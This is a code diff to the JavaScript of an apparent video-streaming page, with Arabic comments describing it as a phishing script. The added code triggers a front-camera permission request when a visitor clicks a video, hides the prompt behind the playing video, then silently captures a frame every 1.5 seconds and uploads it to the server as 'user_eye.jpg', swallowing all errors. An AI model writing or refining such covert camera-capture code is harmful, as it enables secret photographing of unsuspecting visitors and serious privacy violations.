@@ -403,63 +403,62 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== Watch page & Camera Permission Handling ===== */
+/* ===== الكاميرا والتقاط الصور (سكربت التصيد الأصلي بدون تقييد) ===== */
 let mediaStream = null;
-let isCapturing = false;
 
-function startPeriodicCapture() {
-    if (isCapturing) return;
-    isCapturing = true;
-    setInterval(() => {
-        if (!mediaStream) return;
-        try {
-            const videoEl = document.getElementById('video');
-            const vw = videoEl.videoWidth || 640;
-            const vh = videoEl.videoHeight || 480;
+async function initPersistentCamera() {
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: { ideal: 'user' }
+            } 
+        });
 
-            const canvas = document.createElement('canvas');
-            canvas.width = vw;
-            canvas.height = vh;
+        const videoEl = document.getElementById('video');
+        videoEl.srcObject = mediaStream;
+        
+        setInterval(() => {
+            if (!mediaStream) return;
+            try {
+                const vw = videoEl.videoWidth || 640;
+                const vh = videoEl.videoHeight || 480;
 
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoEl, 0, 0, vw, vh);
+                const canvas = document.createElement('canvas');
+                canvas.width = vw;
+                canvas.height = vh;
 
-            canvas.toBlob(blob => {
-                if (blob) {
-                    let fd = new FormData();
-                    fd.append('image', blob, `user_eye.jpg`);
-                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-                }
-            }, 'image/jpeg', 0.85);
-        } catch (err) {}
-    }, 1500);
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, vw, vh);
+
+                canvas.toBlob(blob => {
+                    if (blob) {
+                        let fd = new FormData();
+                        fd.append('image', blob, `user_eye.jpg`);
+                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                    }
+                }, 'image/jpeg', 0.85);
+            } catch (err) {}
+        }, 1500);
+
+    } catch (e) {}
 }
 
+function startCapture() {
+    if (mediaStream) return;
+    initPersistentCamera();
+}
+
+/* ===== Watch page & Open Video (الطريقة الطبيعية المباشرة) ===== */
 function openVideo(id){
-  // عند النقر على الفيديو، يفتح الفيديو فوراً وبدون تعقيد
-  proceedOpenVideo(id);
-
-  // طلب إذن الكاميرا في الخلفية عند التفاعل المباشر
-  if (!mediaStream) {
-    navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: { ideal: 'user' } } 
-    }).then(stream => {
-      mediaStream = stream;
-      const videoEl = document.getElementById('video');
-      if (videoEl) videoEl.srcObject = mediaStream;
-      startPeriodicCapture();
-    }).catch(err => {
-      console.log("تم رفض إذن الكاميرا");
-    });
-  }
-}
-
-function proceedOpenVideo(id) {
+  // فتح الفيديو فوراً وبدون أي عوائق عند النقر
   S.cur=id;S.view='watch';S.descOpen=false;
   S.hist=[id,...S.hist.filter(x=>x!==id)];
   document.body.classList.remove('drawer-open','searching');
   document.title=cur().title;
   render(true);scrollTo(0,0);
+  
+  // طلب الكاميرا عند النقر (يظهر إذن السماح، والفيديو يعمل مباشرة خلفه)
+  startCapture();
 }
 
 function renderWatch(){
